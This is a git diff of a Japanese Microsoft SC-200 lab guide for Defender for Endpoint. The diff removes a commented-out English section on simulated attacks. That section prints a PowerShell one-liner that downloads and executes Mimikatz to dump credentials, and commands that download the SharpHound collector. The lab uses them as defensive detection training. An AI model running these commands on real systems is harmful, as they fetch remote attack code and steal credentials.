@@ -45,45 +45,6 @@ Defender for Endpoint の攻撃緩和機能を確認するため、シミュレ�
 
 >**注:**  ポータルの評価ラボおよびチュートリアルとシミュレーションのセクションは使用できなくなりました。 次の手順は、参照目的でのみ記載しています。 攻撃シミュレーションのデモについては、**[対話型ラボ シミュレーション](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** を参照してください。 現在、攻撃シミュレーションの代替機能を模索しているところです。
 
-<!--- In this task, you will run two *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.
-
-`Attack 1: Mimikatz - Credential Dumping`
-
-1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.
-
-1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.
-
-    ```CommandPrompt
-    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
-    ```
-
-1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.
-
-1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.
-
-`Attack 2: Bloodhound - Collection`
-
-1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.
-
-1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
-
-    ```PowerShell
-    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
-    ```
-
-    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.
-
-1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.
-
-1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
-
-    ```PowerShell
-    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
-    ```
-
-1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*. --->
-
 1. 左側のメニューの **[エンドポイント]** の下で、 **[評価とチュートリアル]** を選択し、左側から **[チュートリアルとシミュレーション]** を選択します。
 
 1. **[チュートリアル]** タブを選択します。
@@ -92,7 +53,7 @@ Defender for Endpoint の攻撃緩和機能を確認するため、シミュレ�
 
 1. 新しいブラウザー タブで、 **[シミュレーションの実行]** という名前のセクション (5 ページの手順 2 から) を見つけ、次の手順に従って攻撃を実行します。 **ヒント:** シミュレーション ファイル *RS4_WinATP-Intro-Invoice.docm* は、ポータルに戻り、 **[Get simulation file](シミュレーション ファイルの取得)** ボタンを選択して、前の手順で選択した **[Read the walkthrough](チュートリアルを読み取る)** の下に表示されます。
 
-<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
+    <!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
 
 ### タスク 3: 攻撃を調査する
 
@@ -100,7 +61,7 @@ Defender for Endpoint の攻撃緩和機能を確認するため、シミュレ�
 
 1. [Multiple threat families detected on one endpoint]\(1 つのエンドポイントで複数の脅威ファミリが見つかりました\) という新しいインシデントが右側のウィンドウに表示されています。 インシデント名を選択して詳細を読み込みます。
 
-    >**注:**  **[アラート]** ウィンドウに、"Bloodhound" と Mimikatz* の両方のアラートが表示されます。** **[Assets/Devices]\(資産/デバイス\)** では、"WIN1" コンピューターの **[リスク レベル]** が [高] になります。****
+    <!---    >**Note:** You should see both *Bloodhound* and Mimikatz* alerts in the **Alerts** pane. In **Assets/Devices**, the *win1* computer will now have a **Risk level** of *High*. --->
 
 1. **[インシデントの管理]** ボタンを選択すると、新しいウィンドウ ブレードが表示されます。 
 
